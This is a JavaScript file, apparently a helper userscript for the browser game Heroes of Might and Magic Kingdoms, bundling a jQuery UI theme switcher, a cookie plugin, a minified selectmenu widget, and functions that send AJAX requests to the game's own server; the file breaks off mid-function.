href="http://jqueryui.com/themeroller/css/parseTheme.css.php?ffDefault=Segoe+UI,+Helvetica,+Arial,+sans-serif&amp;fwDefault=bold&amp;fsDefault=1.1em&amp;cornerRadius=6px&amp;bgColorHeader=9fda58&amp;bgTextureHeader=12_gloss_wave.png&amp;bgImgOpacityHeader=85&amp;borderColorHeader=000000&amp;fcHeader=222222&amp;iconColorHeader=1f1f1f&amp;bgColorContent=000000&amp;bgTextureContent=12_gloss_wave.png&amp;bgImgOpacityContent=55&amp;borderColorContent=4a4a4a&amp;fcContent=ffffff&amp;iconColorContent=9fda58&amp;bgColorDefault=0a0a0a&amp;bgTextureDefault=02_glass.png&amp;bgImgOpacityDefault=40&amp;borderColorDefault=1b1613&amp;fcDefault=b8ec79&amp;iconColorDefault=b8ec79&amp;bgColorHover=000000&amp;bgTextureHover=02_glass.png&amp;bgImgOpacityHover=60&amp;borderColorHover=000000&amp;fcHover=96f226&amp;iconColorHover=b8ec79&amp;bgColorActive=4c4c4c&amp;bgTextureActive=01_flat.png&amp;bgImgOpacityActive=0&amp;borderColorActive=696969&amp;fcActive=ffffff&amp;iconColorActive=ffffff&amp;bgColorHighlight=f1fbe5&amp;bgTextureHighlight=02_glass.png&amp;bgImgOpacityHighlight=55&amp;borderColorHighlight=8cce3b&amp;fcHighlight=030303&amp;iconColorHighlight=000000&amp;bgColorError=f6ecd5&amp;bgTextureError=12_gloss_wave.png&amp;bgImgOpacityError=95&amp;borderColorError=f1ac88&amp;fcError=74736d&amp;iconColorError=cd0a0a&amp;bgColorOverlay=262626&amp;bgTextureOverlay=07_diagonals_small.png&amp;bgImgOpacityOverlay=50&amp;opacityOverlay=30&amp;bgColorShadow=303030&amp;bgTextureShadow=01_flat.png&amp;bgImgOpacityShadow=0&amp;opacityShadow=50&amp;thicknessShadow=6px&amp;offsetTopShadow=-6px&amp;offsetLeftShadow=-6px&amp;cornerRadiusShadow=12px">			<img src="http://jqueryui.com/themeroller/images/themeGallery/theme_90_trontastic.png" alt="Trontastic" title="Trontastic" />			<span class="themeName">Trontastic</span>			</a></li>			<li><a href="http://jqueryui.com/themeroller/css/parseTheme.css.php?ffDefault=Georgia%2C+Verdana%2CArial%2Csans-serif&amp;fwDefault=bold&amp;fsDefault=1.2em&amp;cornerRadius=5px&amp;bgColorHeader=261803&amp;bgTextureHeader=13_diamond.png&amp;bgImgOpacityHeader=8&amp;borderColorHeader=baaa5a&amp;fcHeader=eacd86&amp;iconColorHeader=e9cd86&amp;bgColorContent=443113&amp;bgTextureContent=13_diamond.png&amp;bgImgOpacityContent=8&amp;borderColorContent=efec9f&amp;fcContent=efec9f&amp;iconColorContent=efec9f&amp;bgColorDefault=4f4221&amp;bgTextureDefault=13_diamond.png&amp;bgImgOpacityDefault=10&amp;borderColorDefault=362917&amp;fcDefault=f8eec9&amp;iconColorDefault=e8e2b5&amp;bgColorHover=675423&amp;bgTextureHover=13_diamond.png&amp;bgImgOpacityHover=25&amp;borderColorHover=362917&amp;fcHover=f8eec9&amp;iconColorHover=f2ec64&amp;bgColorActive=443113&amp;bgTextureActive=13_diamond.png&amp;bgImgOpacityActive=8&amp;borderColorActive=efec9f&amp;fcActive=f9f2bd&amp;iconColorActive=f9f2bd&amp;bgColorHighlight=d5ac5d&amp;bgTextureHighlight=13_diamond.png&amp;bgImgOpacityHighlight=25&amp;borderColorHighlight=362917&amp;fcHighlight=060200&amp;iconColorHighlight=070603&amp;bgColorError=fee4bd&amp;bgTextureError=04_highlight_hard.png&amp;bgImgOpacityError=65&amp;borderColorError=c26629&amp;fcError=803f1e&amp;iconColorError=ff7519&amp;bgColorOverlay=372806&amp;bgTextureOverlay=13_diamond.png&amp;bgImgOpacityOverlay=20&amp;opacityOverlay=80&amp;bgColorShadow=ddd4b0&amp;bgTextureShadow=01_flat.png&amp;bgImgOpacityShadow=75&amp;opacityShadow=30&amp;thicknessShadow=8px&amp;offsetTopShadow=-8px&amp;offsetLeftShadow=-8px&amp;cornerRadiusShadow=12px">			<img src="http://jqueryui.com/themeroller/images/themeGallery/theme_90_swanky_purse.png" alt="Swanky Purse" title="Swanky Purse" />			<span class="themeName">Swanky Purse</span>			</a></li>	</ul></div></div>').find('div').removeAttr('id');
	
	//button events
	button.click(
		function(){
			if(switcherpane.is(':visible')){ switcherpane.spHide(); }
			else{ switcherpane.spShow(); }
					return false;
		}
	);
	
	//menu events (mouseout didn't work...)
	switcherpane.hover(
		function(){},
		function(){if(switcherpane.is(':visible')){$(this).spHide();}}
	);

	//show/hide panel functions
	$.fn.spShow = function(){ $(this).css({top: button.offset().top + options.buttonHeight + 6, left: button.offset().left}).slideDown(50); button.css(button_active); options.onOpen(); }
	$.fn.spHide = function(){ $(this).slideUp(50, function(){options.onClose();}); button.css(button_default); }
	
		
	/* Theme Loading
	---------------------------------------------------------------------*/
	switcherpane.find('a').click(function(){
		updateCSS( $(this).attr('href') );
		var themeName = $(this).find('span').text();
		button.find('.jquery-ui-themeswitcher-title').text( options.buttonPreText + themeName );
		//$.cookie(options.cookieName, themeName);
		localStorage.setItem(options.cookieName, themeName);
		options.onSelect();
		if(options.closeOnSelect && switcherpane.is(':visible')){ switcherpane.spHide(); }
		return false;
	});
	
	//function to append a new theme stylesheet with the new style changes
	function updateCSS(locStr){
	
	//	console.log("change theme a"+locStr+"a");
		if(locStr == '#dragon'){
		//	alert(1);
			add_dragon_theme();
			while( $("link.ui-theme").size() > 0){
				$("link.ui-theme:first").remove();
			}
			return;
		}
		remove_dragon_theme();
		var cssLink = $('<link href="'+locStr+'" type="text/css" rel="Stylesheet" class="ui-theme" />');
		
	/*	cssLink.load(function(){
			alert(1);
			$('.ui-dialog-content .ui-widget-header').addStyle({
					backgroundColor:'transparent !important',
					backgroundImage:'none !important'
				});
		});*/
		
		$("head").append(cssLink);
		
		/*$('.ui-dialog-content .ui-widget-header').css({
				backgroundColor:'transparent !important',
				backgroundImage:'none !important'
			});*/
			
		
		
		if( $("link.ui-theme").size() > 3){
			$("link.ui-theme:first").remove();
		}	
	}	
	
	/* Inline CSS 
	---------------------------------------------------------------------*/
	var button_default = {
		fontFamily: 'Trebuchet MS, Verdana, sans-serif',
		fontSize: '11px',
		color: '#666',
		background: '#eee url(http://jqueryui.com/themeroller/themeswitchertool/images/buttonbg.png) 50% 50% repeat-x',
		border: '1px solid #ccc',
		'-moz-border-radius': '6px',
		'-webkit-border-radius': '6px',
		textDecoration: 'none',
		padding: '3px 3px 3px 8px',
		width: options.width - 11,//minus must match left and right padding 
		display: 'block',
		height: options.buttonHeight,
		outline: '0'
	};
	var button_hover = {
		'borderColor':'#bbb',
		'background': '#f0f0f0',
		cursor: 'pointer',
		color: '#444'
	};
	var button_active = {
		color: '#aaa',
		background: '#000',
		border: '1px solid #ccc',
		borderBottom: 0,
		'-moz-border-radius-bottomleft': 0,
		'-webkit-border-bottom-left-radius': 0,
		'-moz-border-radius-bottomright': 0,
		'-webkit-border-bottom-right-radius': 0,
		outline: '0'
	};
	
	
	
	//button css
	button.css(button_default)
	.hover(
		function(){ 
			$(this).css(button_hover); 
		},
		function(){ 
		 if( !switcherpane.is(':animated') && switcherpane.is(':hidden') ){	$(this).css(button_default);  }
		}	
	)
	.find('.jquery-ui-themeswitcher-icon').css({
		float: 'right',
		width: '16px',
		height: '16px',
		background: 'url(http://jqueryui.com/themeroller/themeswitchertool/images/icon_color_arrow.gif) 50% 50% no-repeat'
	});
	//.addClass('ui-state-default ui-corner-all ui-widget');	
	//pane css
	switcherpane.css({
		position: 'absolute',
		float: 'left',
		fontFamily: 'Trebuchet MS, Verdana, sans-serif',
		fontSize: '12px',
		background: '#000',
		color: '#fff',
		padding: '8px 3px 3px',
		border: '1px solid #ccc',
		'-moz-border-radius-bottomleft': '6px',
		'-webkit-border-bottom-left-radius': '6px',
		'-moz-border-radius-bottomright': '6px',
		'-webkit-border-bottom-right-radius': '6px',
		borderTop: 0,
		zIndex: 999999,
		width: options.width-6//minus must match left and right padding
	})
	.find('ul').css({
		listStyle: 'none',
		margin: '0',
		padding: '0',
		overflow: 'auto',
		height: options.height
	}).end()
	.find('li').hover(
		function(){ 
			$(this).css({
				'borderColor':'#555',
				'background': 'url(http://jqueryui.com/themeroller/themeswitchertool/images/menuhoverbg.png) 50% 50% repeat-x',
				cursor: 'pointer'
			}); 
		},
		function(){ 
			$(this).css({
				'borderColor':'#111',
				'background': '#000',
				cursor: 'auto'
			}); 
		}
	).css({
		width: options.width-30,
		height: '',
		padding: '2px',
		margin: '1px',
		border: '1px solid #111',
		'-moz-border-radius': '4px',
		clear: 'left',
		float: 'left'
	}).end()
	.find('a').css({
		color: '#aaa',
		textDecoration: 'none',
		float: 'left',
		width: '100%',
		outline: '0'
	}).end()
	.find('img').css({
		float: 'left',
		border: '1px solid #333',
		margin: '0 2px'
	}).end()
	.find('.themeName').css({
		float: 'left',
		margin: '3px 0'
	}).end();
	


	$(this).append(button);
	$('body').append(switcherpane);
	switcherpane.hide();
	
	
	if( localStorage.getItem(options.cookieName) || options.loadTheme ){
		var themeName = localStorage.getItem(options.cookieName) || options.loadTheme;
		switcherpane.find('a:contains('+ themeName +')').trigger('click');
	}

	return this;
};




/**
 * Cookie plugin
 *
 * Copyright (c) 2006 Klaus Hartl (stilbuero.de)
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
 *
 */
jQuery.cookie = function(name, value, options) {
    if (typeof value != 'undefined') { // name and value given, set cookie
        options = options || {};
        if (value === null) {
            value = '';
            options.expires = -1;
        }
        var expires = '';
        if (options.expires && (typeof options.expires == 'number' || options.expires.toUTCString)) {
            var date;
            if (typeof options.expires == 'number') {
                date = new Date();
                date.setTime(date.getTime() + (options.expires * 24 * 60 * 60 * 1000));
            } else {
                date = options.expires;
            }
            expires = '; expires=' + date.toUTCString(); // use expires attribute, max-age is not supported by IE
        }
        // CAUTION: Needed to parenthesize options.path and options.domain
        // in the following expressions, otherwise they evaluate to undefined
        // in the packed version for some reason...
        var path = options.path ? '; path=' + (options.path) : '';
        var domain = options.domain ? '; domain=' + (options.domain) : '';
        var secure = options.secure ? '; secure' : '';
        document.cookie = [name, '=', encodeURIComponent(value), expires, path, domain, secure].join('');
    } else { // only name given, get cookie
        var cookieValue = null;
        if (document.cookie && document.cookie != '') {
            var cookies = document.cookie.split(';');
            for (var i = 0; i < cookies.length; i++) {
                var cookie = jQuery.trim(cookies[i]);
                // Does this cookie string begin with the name we want?
                if (cookie.substring(0, name.length + 1) == (name + '=')) {
                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                    break;
                }
            }
        }
        return cookieValue;
    }
};
 /*
 * jQuery UI selectmenu dev version
 *
 * Copyright (c) 2009 AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT (MIT-LICENSE.txt)
 * and GPL (GPL-LICENSE.txt) licenses.
 *
 * http://docs.jquery.com/UI
 * https://github.com/fnagel/jquery-ui/wiki/Selectmenu
 */
(function($){$.widget("ui.selectmenu",{getter:"value",version:"1.8",eventPrefix:"selectmenu",options:{transferClasses:true,typeAhead:"sequential",style:'dropdown',positionOptions:{my:"left top",at:"left bottom",offset:null},width:null,menuWidth:null,handleWidth:26,maxHeight:null,icons:null,format:null,bgImage:function(){},wrapperElement:""},_create:function(){var c=this,o=this.options;var d=this.element.attr('id')||'ui-selectmenu-'+Math.random().toString(16).slice(2,10);this.ids=[d+'-button',d+'-menu'];this._safemouseup=true;this.newelement=$('<a class="'+this.widgetBaseClass+' ui-widget ui-state-default ui-corner-all" id="'+this.ids[0]+'" role="button" href="#" tabindex="0" aria-haspopup="true" aria-owns="'+this.ids[1]+'"></a>').insertAfter(this.element);this.newelement.wrap(o.wrapperElement);var e=this.element.attr('tabindex');if(e){this.newelement.attr('tabindex',e)}this.newelement.data('selectelement',this.element);this.selectmenuIcon=$('<span class="'+this.widgetBaseClass+'-icon ui-icon"></span>').prependTo(this.newelement);this.newelement.prepend('<span class="'+c.widgetBaseClass+'-status" />');$('label[for="'+d+'"]').attr('for',this.ids[0]).bind('click.selectmenu',function(){c.newelement[0].focus();return false});this.newelement.bind('mousedown.selectmenu',function(a){c._toggle(a,true);if(o.style=="popup"){c._safemouseup=false;setTimeout(function(){c._safemouseup=true},300)}return false}).bind('click.selectmenu',function(){return false}).bind("keydown.selectmenu",function(a){var b=false;switch(a.keyCode){case $.ui.keyCode.ENTER:b=true;break;case $.ui.keyCode.SPACE:c._toggle(a);break;case $.ui.keyCode.UP:if(a.altKey){c.open(a)}else{c._moveSelection(-1)}break;case $.ui.keyCode.DOWN:if(a.altKey){c.open(a)}else{c._moveSelection(1)}break;case $.ui.keyCode.LEFT:c._moveSelection(-1);break;case $.ui.keyCode.RIGHT:c._moveSelection(1);break;case $.ui.keyCode.TAB:b=true;break;default:b=true}return b}).bind('keypress.selectmenu',function(a){c._typeAhead(a.which,'mouseup');return true}).bind('mouseover.selectmenu focus.selectmenu',function(){if(!o.disabled){$(this).addClass(c.widgetBaseClass+'-focus ui-state-hover')}}).bind('mouseout.selectmenu blur.selectmenu',function(){if(!o.disabled){$(this).removeClass(c.widgetBaseClass+'-focus ui-state-hover')}});$(document).bind("mousedown.selectmenu",function(a){c.close(a)});this.element.bind("click.selectmenu",function(){c._refreshValue()}).bind("focus.selectmenu",function(){if(c.newelement){c.newelement[0].focus()}});if(!o.width){o.width=this.element.outerWidth()}this.newelement.width(o.width);this.element.hide();this.list=$('<ul class="'+c.widgetBaseClass+'-menu ui-widget ui-widget-content" aria-hidden="true" role="listbox" aria-labelledby="'+this.ids[0]+'" id="'+this.ids[1]+'"></ul>').appendTo('body');this.list.wrap(o.wrapperElement);this.list.bind("keydown.selectmenu",function(a){var b=false;switch(a.keyCode){case $.ui.keyCode.UP:if(a.altKey){c.close(a,true)}else{c._moveFocus(-1)}break;case $.ui.keyCode.DOWN:if(a.altKey){c.close(a,true)}else{c._moveFocus(1)}break;case $.ui.keyCode.LEFT:c._moveFocus(-1);break;case $.ui.keyCode.RIGHT:c._moveFocus(1);break;case $.ui.keyCode.HOME:c._moveFocus(':first');break;case $.ui.keyCode.PAGE_UP:c._scrollPage('up');break;case $.ui.keyCode.PAGE_DOWN:c._scrollPage('down');break;case $.ui.keyCode.END:c._moveFocus(':last');break;case $.ui.keyCode.ENTER:case $.ui.keyCode.SPACE:c.close(a,true);$(a.target).parents('li:eq(0)').trigger('mouseup');break;case $.ui.keyCode.TAB:b=true;c.close(a,true);$(a.target).parents('li:eq(0)').trigger('mouseup');break;case $.ui.keyCode.ESCAPE:c.close(a,true);break;default:b=true}return b}).bind('keypress.selectmenu',function(a){c._typeAhead(a.which,'focus');return true}).bind('mousedown.selectmenu mouseup.selectmenu',function(){return false});$(window).bind("resize.selectmenu",$.proxy(c._refreshPosition,this))},_init:function(){var c=this,o=this.options;var d=[];this.element.find('option').each(function(){d.push({value:$(this).attr('value'),text:c._formatText($(this).text()),selected:$(this).attr('selected'),disabled:$(this).attr('disabled'),classes:$(this).attr('class'),typeahead:$(this).attr('typeahead'),parentOptGroup:$(this).parent('optgroup'),bgImage:o.bgImage.call($(this))})});var f=(c.options.style=="popup")?" ui-state-active":"";this.list.html("");for(var i=0;i<d.length;i++){var g=$('<li role="presentation"'+(d[i].disabled?' class="'+this.namespace+'-state-disabled'+'"':'')+'><a href="#" tabindex="-1" role="option"'+(d[i].disabled?' aria-disabled="true"':'')+' aria-selected="false"'+(d[i].typeahead?' typeahead="'+d[i].typeahead+'"':'')+'>'+d[i].text+'</a></li>').data('index',i).addClass(d[i].classes).data('optionClasses',d[i].classes||'').bind("mouseup.selectmenu",function(a){if(c._safemouseup&&!c._disabled(a.currentTarget)&&!c._disabled($(a.currentTarget).parents("ul>li."+c.widgetBaseClass+"-group "))){var b=$(this).data('index')!=c._selectedIndex();c.index($(this).data('index'));c.select(a);if(b){c.change(a)}c.close(a,true)}return false}).bind("click.selectmenu",function(){return false}).bind('mouseover.selectmenu focus.selectmenu',function(e){if(!$(e.currentTarget).hasClass(c.namespace+'-state-disabled')&&!$(e.currentTarget).parent("ul").parent("li").hasClass(c.namespace+'-state-disabled')){c._selectedOptionLi().addClass(f);c._focusedOptionLi().removeClass(c.widgetBaseClass+'-item-focus ui-state-hover');$(this).removeClass('ui-state-active').addClass(c.widgetBaseClass+'-item-focus ui-state-hover')}}).bind('mouseout.selectmenu blur.selectmenu',function(){if($(this).is(c._selectedOptionLi().selector)){$(this).addClass(f)}$(this).removeClass(c.widgetBaseClass+'-item-focus ui-state-hover')});if(d[i].parentOptGroup.length){var h=c.widgetBaseClass+'-group-'+this.element.find('optgroup').index(d[i].parentOptGroup);if(this.list.find('li.'+h).length){this.list.find('li.'+h+':last ul').append(g)}else{$(' <li role="presentation" class="'+c.widgetBaseClass+'-group '+h+(d[i].parentOptGroup.attr("disabled")?' '+this.namespace+'-state-disabled" aria-disabled="true"':'"')+'><span class="'+c.widgetBaseClass+'-group-label">'+d[i].parentOptGroup.attr('label')+'</span><ul></ul></li> ').appendTo(this.list).find('ul').append(g)}}else{g.appendTo(this.list)}if(o.icons){for(var j in o.icons){if(g.is(o.icons[j].find)){g.data('optionClasses',d[i].classes+' '+c.widgetBaseClass+'-hasIcon').addClass(c.widgetBaseClass+'-hasIcon');var k=o.icons[j].icon||"";g.find('a:eq(0)').prepend('<span class="'+c.widgetBaseClass+'-item-icon ui-icon '+k+'"></span>');if(d[i].bgImage){g.find('span').css('background-image',d[i].bgImage)}}}}}var l=(o.style=='dropdown');this.newelement.toggleClass(c.widgetBaseClass+'-dropdown',l).toggleClass(c.widgetBaseClass+'-popup',!l);this.list.toggleClass(c.widgetBaseClass+'-menu-dropdown ui-corner-bottom',l).toggleClass(c.widgetBaseClass+'-menu-popup ui-corner-all',!l).find('li:first').toggleClass('ui-corner-top',!l).end().find('li:last').addClass('ui-corner-bottom');this.selectmenuIcon.toggleClass('ui-icon-triangle-1-s',l).toggleClass('ui-icon-triangle-2-n-s',!l);if(o.transferClasses){var m=this.element.attr('class')||'';this.newelement.add(this.list).addClass(m)}if(o.style=='dropdown'){this.list.width(o.menuWidth?o.menuWidth:o.width)}else{this.list.width(o.menuWidth?o.menuWidth:o.width-o.handleWidth)}this.list.css("height","auto");var n=this.list.height();if(o.maxHeight&&o.maxHeight<n){this.list.height(o.maxHeight)}else{var p=$(window).height()/3;if(p<n)this.list.height(p)}this._optionLis=this.list.find('li:not(.'+c.widgetBaseClass+'-group)');if(this.element.attr('disabled')===true){this.disable()}else{this.enable()}this.index(this._selectedIndex());window.setTimeout(function(){c._refreshPosition()},200)},destroy:function(){this.element.removeData(this.widgetName).removeClass(this.widgetBaseClass+'-disabled'+' '+this.namespace+'-state-disabled').removeAttr('aria-disabled').unbind(".selectmenu");$(window).unbind(".selectmenu");$(document).unbind(".selectmenu");$('label[for='+this.newelement.attr('id')+']').attr('for',this.element.attr('id')).unbind('.selectmenu');if(this.options.wrapperElement){this.newelement.find(this.options.wrapperElement).remove();this.list.find(this.options.wrapperElement).remove()}else{this.newelement.remove();this.list.remove()}this.element.show();$.Widget.prototype.destroy.apply(this,arguments)},_typeAhead:function(d,e){var f=this,h=false,C=String.fromCharCode(d).toUpperCase();c=C.toLowerCase();if(f.options.typeAhead=='sequential'){window.clearTimeout('ui.selectmenu-'+f.selectmenuId);var g=typeof(f._prevChar)=='undefined'?'':f._prevChar.join('');function focusOptSeq(a,b,c){h=true;$(a).trigger(e);typeof(f._prevChar)=='undefined'?f._prevChar=[c]:f._prevChar[f._prevChar.length]=c}this.list.find('li a').each(function(i){if(!h){var a=$(this).attr('typeahead')||$(this).text();if(a.indexOf(g+C)==0){focusOptSeq(this,i,C)}else if(a.indexOf(g+c)==0){focusOptSeq(this,i,c)}}});window.setTimeout(function(a){f._prevChar=undefined},1000,f)}else{if(!f._prevChar){f._prevChar=['',0]}var h=false;function focusOpt(a,b){h=true;$(a).trigger(e);f._prevChar[1]=b}this.list.find('li a').each(function(i){if(!h){var a=$(this).text();if(a.indexOf(C)==0||a.indexOf(c)==0){if(f._prevChar[0]==C){if(f._prevChar[1]<i){focusOpt(this,i)}}else{focusOpt(this,i)}}}});this._prevChar[0]=C}},_uiHash:function(){var a=this.index();return{index:a,option:$("option",this.element).get(a),value:this.element[0].value}},open:function(a){var b=this;if(this.newelement.attr("aria-disabled")!='true'){this._closeOthers(a);this.newelement.addClass('ui-state-active');if(b.options.wrapperElement){this.list.parent().appendTo('body')}else{this.list.appendTo('body')}this.list.addClass(b.widgetBaseClass+'-open').attr('aria-hidden',false).find('li:not(.'+b.widgetBaseClass+'-group):eq('+this._selectedIndex()+') a')[0].focus();if(this.options.style=="dropdown"){this.newelement.removeClass('ui-corner-all').addClass('ui-corner-top')}this._refreshPosition();this._trigger("open",a,this._uiHash())}},close:function(a,b){if(this.newelement.is('.ui-state-active')){this.newelement.removeClass('ui-state-active');this.list.attr('aria-hidden',true).removeClass(this.widgetBaseClass+'-open');if(this.options.style=="dropdown"){this.newelement.removeClass('ui-corner-top').addClass('ui-corner-all')}if(b){this.newelement.focus()}this._trigger("close",a,this._uiHash())}},change:function(a){this.element.trigger("change");this._trigger("change",a,this._uiHash())},select:function(a){if(this._disabled(a.currentTarget)){return false}this._trigger("select",a,this._uiHash())},_closeOthers:function(a){$('.'+this.widgetBaseClass+'.ui-state-active').not(this.newelement).each(function(){$(this).data('selectelement').selectmenu('close',a)});$('.'+this.widgetBaseClass+'.ui-state-hover').trigger('mouseout')},_toggle:function(a,b){if(this.list.is('.'+this.widgetBaseClass+'-open')){this.close(a,b)}else{this.open(a)}},_formatText:function(a){return(this.options.format?this.options.format(a):a)},_selectedIndex:function(){return this.element[0].selectedIndex},_selectedOptionLi:function(){return this._optionLis.eq(this._selectedIndex())},_focusedOptionLi:function(){return this.list.find('.'+this.widgetBaseClass+'-item-focus')},_moveSelection:function(a,b){if(!this.options.disabled){var c=parseInt(this._selectedOptionLi().data('index')||0,10);var d=c+a;if(d<0){d=0}if(d>this._optionLis.size()-1){d=this._optionLis.size()-1}if(d===b){return false}if(this._optionLis.eq(d).hasClass(this.namespace+'-state-disabled')){(a>0)?++a:--a;this._moveSelection(a,d)}else{return this._optionLis.eq(d).trigger('mouseup')}}},_moveFocus:function(a,b){if(!isNaN(a)){var c=parseInt(this._focusedOptionLi().data('index')||0,10);var d=c+a}else{var d=parseInt(this._optionLis.filter(a).data('index'),10)}if(d<0){d=0}if(d>this._optionLis.size()-1){d=this._optionLis.size()-1}if(d===b){return false}var e=this.widgetBaseClass+'-item-'+Math.round(Math.random()*1000);this._focusedOptionLi().find('a:eq(0)').attr('id','');if(this._optionLis.eq(d).hasClass(this.namespace+'-state-disabled')){(a>0)?++a:--a;this._moveFocus(a,d)}else{this._optionLis.eq(d).find('a:eq(0)').attr('id',e).focus()}this.list.attr('aria-activedescendant',e)},_scrollPage:function(a){var b=Math.floor(this.list.outerHeight()/this.list.find('li:first').outerHeight());b=(a=='up'?-b:b);this._moveFocus(b)},_setOption:function(a,b){this.options[a]=b;if(a=='disabled'){this.close();this.element.add(this.newelement).add(this.list)[b?'addClass':'removeClass'](this.widgetBaseClass+'-disabled'+' '+this.namespace+'-state-disabled').attr("aria-disabled",b)}},disable:function(a,b){if(typeof(a)=='undefined'){this._setOption('disabled',true)}else{if(b=="optgroup"){this._disableOptgroup(a)}else{this._disableOption(a)}}},enable:function(a,b){if(typeof(a)=='undefined'){this._setOption('disabled',false)}else{if(b=="optgroup"){this._enableOptgroup(a)}else{this._enableOption(a)}}},_disabled:function(a){return $(a).hasClass(this.namespace+'-state-disabled')},_disableOption:function(a){var b=this._optionLis.eq(a);if(b){b.addClass(this.namespace+'-state-disabled').find("a").attr("aria-disabled",true);this.element.find("option").eq(a).attr("disabled","disabled")}},_enableOption:function(a){var b=this._optionLis.eq(a);if(b){b.removeClass(this.namespace+'-state-disabled').find("a").attr("aria-disabled",false);this.element.find("option").eq(a).removeAttr("disabled")}},_disableOptgroup:function(a){var b=this.list.find('li.'+this.widgetBaseClass+'-group-'+a);if(b){b.addClass(this.namespace+'-state-disabled').attr("aria-disabled",true);this.element.find("optgroup").eq(a).attr("disabled","disabled")}},_enableOptgroup:function(a){var b=this.list.find('li.'+this.widgetBaseClass+'-group-'+a);if(b){b.removeClass(this.namespace+'-state-disabled').attr("aria-disabled",false);this.element.find("optgroup").eq(a).removeAttr("disabled")}},index:function(a){if(arguments.length){if(!this._disabled($(this._optionLis[a]))){this.element[0].selectedIndex=a;this._refreshValue()}else{return false}}else{return this._selectedIndex()}},value:function(a){if(arguments.length){this.element[0].value=a;this._refreshValue()}else{return this.element[0].value}},_refreshValue:function(){var a=(this.options.style=="popup")?" ui-state-active":"";var b=this.widgetBaseClass+'-item-'+Math.round(Math.random()*1000);this.list.find('.'+this.widgetBaseClass+'-item-selected').removeClass(this.widgetBaseClass+"-item-selected"+a).find('a').attr('aria-selected','false').attr('id','');this._selectedOptionLi().addClass(this.widgetBaseClass+"-item-selected"+a).find('a').attr('aria-selected','true').attr('id',b);var c=(this.newelement.data('optionClasses')?this.newelement.data('optionClasses'):"");var d=(this._selectedOptionLi().data('optionClasses')?this._selectedOptionLi().data('optionClasses'):"");this.newelement.removeClass(c).data('optionClasses',d).addClass(d).find('.'+this.widgetBaseClass+'-status').html(this._selectedOptionLi().find('a:eq(0)').html());this.list.attr('aria-activedescendant',b)},_refreshPosition:function(){var o=this.options;if(o.style=="popup"&&!o.positionOptions.offset){var a=this._selectedOptionLi();var b="0 -"+(a.outerHeight()+a.offset().top-this.list.offset().top)}var c=this.element.zIndex();if(c){this.list.css({zIndex:c})}this.list.position({of:o.positionOptions.of||this.newelement,my:o.positionOptions.my,at:o.positionOptions.at,offset:o.positionOptions.offset||b,collision:o.positionOptions.collision||'flip'})}})})(jQuery);	
	function extend( objA, objB ){
        for (var i in objB){
            objA[i] = objB[i];
        }
        return objA;
	}

	function localStorage_setObject (key, value) {
		localStorage.setItem(key, JSON.stringify(value));
	}
	 
	function localStorage_getObject (key, default_value) {
		var value = localStorage.getItem(key);
		if (value)
			return JSON.parse(value); 
		return default_value;
	}
	
	
	function toggle_dialog( $dialog ){
		$dialog.dialog( $dialog.dialog('isOpen') ? 'close' : 'open' );
	}
	
	function get_frame(){
		var frame = null ;
		var displayedFrameList = HOMMK.displayedFrameList;
		if ( displayedFrameList && displayedFrameList.length>=1 ) 
			frame = displayedFrameList[0];
		return frame;
	}
	
	function coord( x,y ){
		return ('('+Math.floor(x)+','+Math.ceil(y)+')');
	}
	
	function injectAfter(S,A) {
		return function() {
			var arg = Array.prototype.slice.call(arguments, 0);
			arg.unshift(S.apply(this,arguments));
			return A.apply(this, arg);
		};
	};
	
	//-----------------------------------------------------------
	//                        FALCONVVS
	//-----------------------------------------------------------
	function processReturnData ( json ) {
		var a = json[HOMMK.JSON_RESPONSE_UPDATEPUSH_PARAM_NAME] || new Array();
		var g= json[HOMMK.JSON_RESPONSE_TIME_PARAM_NAME];
		var f = json[HOMMK.JSON_RESPONSE_ERROR_PARAM_NAME];
		if( !f ) {
			for ( var ki=0;ki<a.length;ki++){
				var k = a[ki];
				if ( HOMMK.issetElement(k.elementType,k.elementId) )
					var j = HOMMK.getElement(k.elementType,k.elementId);
				switch(k.type)
				{
					case HOMMK.UPDATEPUSH_TYPE_CONTENT_UPDATE:
						if ( j && j.options.acceptsPush )
							j.updateRefreshable(k.content,g);
						break;
					case HOMMK.UPDATEPUSH_TYPE_UPDATE:
						if ( j &&j.options.acceptsPush )
							j.updateRefreshable();
						break;
					case HOMMK.UPDATEPUSH_TYPE_LIST_CONTENT_UPDATE:
						if ( j && j.options.acceptsPush )
							j[k.elementListName].updateRefreshable(k.content,g);
						break;
					case HOMMK.UPDATEPUSH_TYPE_LIST_UPDATE:
						if( j && j.options.acceptsPush )
							j[k.elementListName].updateRefreshable();
						break;
					case HOMMK.UPDATEPUSH_TYPE_DELETE:
						if( j &&j.options.acceptsPush )
							j.immediateTrash();
						break;
					case HOMMK.UPDATEPUSH_TYPE_ADD:
						if( j ) {
							var h=$A([]);
							if( k.parentId ){
								if ( HOMMK.issetElement(k.parentType,k.parentId) )
									h.include(HOMMK.getElement(k.parentType,k.parentId));
							} else
								h=HOMMK.getElementListArray(k.parentType);
								for ( var li in h ){
									var l = h[li];
									if(l.isValid)
										l["add"+k.elementType+"Content"](k.content,g,true);
							}
						}
						break;
					case HOMMK.UPDATEPUSH_TYPE_ACTION:
						if ( j && j.options.acceptsPush )
							j[k.actionName].attempt( k.actionParams ? k.actionParams.split(HOMMK.UPDATEPUSH_ACTION_PARAMS_SEPARATOR) : null, j );
						break;
					default:
						break;
				}
			}
		}
	}
	
	function do_request( json, callback , type ){
		type = type || 'getContent';
		var xmlhttp= new XMLHttpRequest();
		xmlhttp.open("POST", 'http://'+window.location.host+'/ajaxRequest/'+type,true);
		xmlhttp.onreadystatechange=function() {
			if (xmlhttp.readyState==4) {
				var result = JSON.parse(xmlhttp.responseText);
				callback( result );
				if(!!ADMIN_DEBUG)
					handle(result.d,result.t,result.u);
				processReturnData( result );
			}
		};
		xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
		xmlhttp.setRequestHeader("X-Request", "JSON");
		xmlhttp.send('json='+JSON.stringify(json));
	}
	
	w.d = do_request;HOMMK_user.func.doAsyncRequest = do_request;
	
	function do_request_sync( json, type ) {
		type = type || 'getContent';
		var xmlhttp= new XMLHttpRequest();
		xmlhttp.open("POST", 'http://'+window.location.host+'/ajaxRequest/'+type,false);
		xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
